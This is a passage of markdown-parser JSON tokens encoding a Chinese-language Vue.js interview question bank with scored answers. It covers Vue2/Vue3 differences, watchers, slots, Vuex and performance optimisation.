模板支持多个根标签","text":"**1：** Vue3 的 template 模板支持多个根标签","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue3 的 template 模板支持多个根标签","text":" Vue3 的 template 模板支持多个根标签","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore\\n","task":false,"loose":false,"text":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","tokens":[{"type":"text","raw":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","text":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","text":" Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例\\n","task":false,"loose":false,"text":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","tokens":[{"type":"text","raw":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","text":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","text":" Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props\\n","task":false,"loose":false,"text":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","tokens":[{"type":"text","raw":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","text":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","text":" Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","task":false,"loose":false,"text":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","tokens":[{"type":"text","raw":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","text":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","text":" 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. watch 和 watchEffect 的区别？\\n\\n","depth":2,"text":"2. watch 和 watchEffect 的区别？","tokens":[{"type":"text","raw":"2. watch 和 watchEffect 的区别？","text":"2. watch 和 watchEffect 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"* **1：** watch ：既要指明监视的数据源，也要指明监视的回调。\\n* **1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。\\n* **1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** watch ：既要指明监视的数据源，也要指明监视的回调。\\n","task":false,"loose":false,"text":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","tokens":[{"type":"text","raw":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","text":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watch ：既要指明监视的数据源，也要指明监视的回调。","text":" watch ：既要指明监视的数据源，也要指明监视的回调。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。\\n","task":false,"loose":false,"text":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","tokens":[{"type":"text","raw":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","text":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","text":" watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","task":false,"loose":false,"text":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","tokens":[{"type":"text","raw":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","text":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","text":" watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 3. 在 Vue2.x 中如何检测数组的变化？\\n\\n","depth":2,"text":"3. 在 Vue2.x 中如何检测数组的变化？","tokens":[{"type":"text","raw":"3. 在 Vue2.x 中如何检测数组的变化？","text":"3. 在 Vue2.x 中如何检测数组的变化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","task":false,"loose":false,"text":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","tokens":[{"type":"text","raw":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","text":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","text":" 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 4. 在 v-if 与 v-show 的区别？\\n\\n","depth":2,"text":"4. 在 v-if 与 v-show 的区别？","tokens":[{"type":"text","raw":"4. 在 v-if 与 v-show 的区别？","text":"4. 在 v-if 与 v-show 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","task":false,"loose":false,"text":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","tokens":[{"type":"text","raw":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","text":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","text":" 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 5. 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？\\n\\n","depth":2,"text":"5. 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","tokens":[{"type":"text","raw":"5. 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","text":"5. 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 默认插槽、具名插槽、作用域插槽","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 默认插槽、具名插槽、作用域插槽","task":false,"loose":false,"text":"**1：** 默认插槽、具名插槽、作用域插槽","tokens":[{"type":"text","raw":"**1：** 默认插槽、具名插槽、作用域插槽","text":"**1：** 默认插槽、具名插槽、作用域插槽","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 默认插槽、具名插槽、作用域插槽","text":" 默认插槽、具名插槽、作用域插槽","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 6. 简述 Vuex 的核心概念和工作流程\\n\\n","depth":2,"text":"6. 简述 Vuex 的核心概念和工作流程","tokens":[{"type":"text","raw":"6. 简述 Vuex 的核心概念和工作流程","text":"6. 简述 Vuex 的核心概念和工作流程","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* **1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)\\n* **1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)\\n","task":false,"loose":false,"text":"**1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","tokens":[{"type":"text","raw":"**1：** 核心概念:<br/>\\n\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","text":"**1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 核心概念:","text":" 核心概念:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, ","text":"\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, ","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。","text":"\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。","text":"\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","text":"\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","task":false,"loose":false,"text":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","tokens":[{"type":"text","raw":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\n\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n\\n和组件的更新。","text":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 工作流程：","text":" 工作流程：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","text":"组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 7. Vue项目中如何进行性能优化？\\n\\n","depth":2,"text":"7. Vue项目中如何进行性能优化？","tokens":[{"type":"text","raw":"7. Vue项目中如何进行性能优化？","text":"7. Vue项目中如何进行性能优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（10分）\\n\\n","depth":4,"text":"解答（10分）","tokens":[{"type":"text","raw":"解答（10分）","text":"解答（10分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 DOM 元素始终存在于文档中。<br/>\\n&emsp;应用场景：对于那些在运行时很少改变显示状态的组件，比如用户权限相关的组件，只有管理员才能看到的功能组件，使用v-if比较合适。\\n对于频繁切换显示隐藏状态的组件，如页面中的导航栏下拉菜单，使用v-show能减少组件的销毁和重建带来的性能损耗。<br>\\n* **1：** 优化组件的props和events传递：<br/>\\n&emsp;原理：当组件的props发生变化时，组件会重新渲染。如果传递了不必要的props或者过于复杂的数据结构作为props，会增加组\\n件重新渲染的概率和成本。同样，过多的$emit事件也可能导致组件之间通信过于复杂，影响性能。<br/>\\n&emsp;应用场景：只传递组件真正需要的数据作为props。例如，一个列表组件只需要接收列表数据和展示格式相关的参数，而不需要接收整个应\\n用的状态数据。在组件内部，对于复杂的数据结构作为props，可以考虑使用Object.freeze()来冻结数据，防止在组件内部意外修改导致重新渲染。\\n对于$emit事件，只在必要时使用，并且确保事件名称清晰明了，避免过多的、不必要的事件通信。\\n* **1：** 使用keep-alive缓存组件:<br/>\\n&emsp;原理：keep-alive是 Vue 提供的一个内置组件，它能够缓存包裹在其中的组件。当组件被缓存时，再次激活这个组件时不会重新创建和\\n初始化，而是直接从缓存中取出，保留了组件之前的状态，从而减少了组件重新创建和渲染的开销。<br/>\\n&emsp;应用场景：适用于那些频繁切换但数据变化不大的组件。比如在一个多步骤表单应用中，用户在各个步骤之间来回切换，使用keep-alive包裹\\n表单步骤组件，可以避免每次切换步骤都重新创建表单组件，提高用户体验和应用性能。\\n* **1：** 列表渲染优化: 为v-for列表添加key属性<br/>\\n&emsp;原理：key属性是 Vue 用于识别v - for循环中的每个节点的唯一标识。当列表数据发生变化时，Vue 会根据key属性来更精准地判断哪些节点需要\\n更新、移动、添加或删除。如果没有key属性或者key属性不唯一，Vue 可能会进行不必要的 DOM 操作，导致性能下降。<br/>\\n&emsp;应用场景：在任何使用v - for进行列表渲染的地方都应该添加key属性。例如，渲染一个商品列表时，使用商品的唯一ID作为key\\n* **2：** 数据响应式优化: 避免过度的响应式数据<br/>\\n&emsp;原理：Vue 的响应式系统是通过Object.defineProperty()（在 Vue 3 中也有Proxy方式）对数据进行劫持来实现的。如果一个对象包含大量的数据，\\n并且这些数据大部分在组件的生命周期内都不会发生变化，将所有数据都设置为响应式会增加不必要的性能开销。<br/>\\n&emsp;应用场景：对于那些不需要响应式的数据，可以将其定义在组件的data属性之外。例如，一个组件中有一些常量数据，如固定的颜色列表、图标列表等，可以将\\n这些数据定义为普通的 JavaScript 对象，而不是放在data属性中。在 Vue 3 中，还可以使用shallowReactive或shallowRef来创建浅层响应式数据，只\\n对对象的第一层数据进行响应式处理，减少性能消耗。\\n* **2：** 路由层面优化: 路由懒加载<br/>\\n&emsp;原理：路由懒加载可以将路由对应的组件分割成不同的代码块，只有在访问该路由时才会加载对应的组件代码。这样可以减少应用初始加载时的代码体积，加\\n快首屏加载速度。<br/>\\n&emsp;应用场景：对于大型的单页面应用（SPA），尤其是包含多个页面或功能模块的应用，如一个电商应用中的商品详情页、购物车页、个人中心页等，都可以采用路由懒\\n加载的方式。在 Vue Router 中，可以使用动态import来实现路由懒加载，例如const ProductDetail = () => import(\'./views/ProductDetail.vue\')，在\\n路由配置中{ path: \'/product - detail\', component: ProductDetail }。\\n* **1：** 代码压缩和混淆（Webpack 相关）<br/>\\n&emsp;原理：在构建过程中，通过工具（如terser-webpack-plugin）对 JavaScript 代码进行压缩和混淆，可以减小代码文件的大小。压缩是去除代码中的空格、注\\n释等冗余信息，混淆是将代码中的变量名、函数名等替换为更短的、难以理解的名称，从而减少代码体积，加快下载速度。<br/>\\n* **1：** 合理设置chunk大小和数量（Webpack 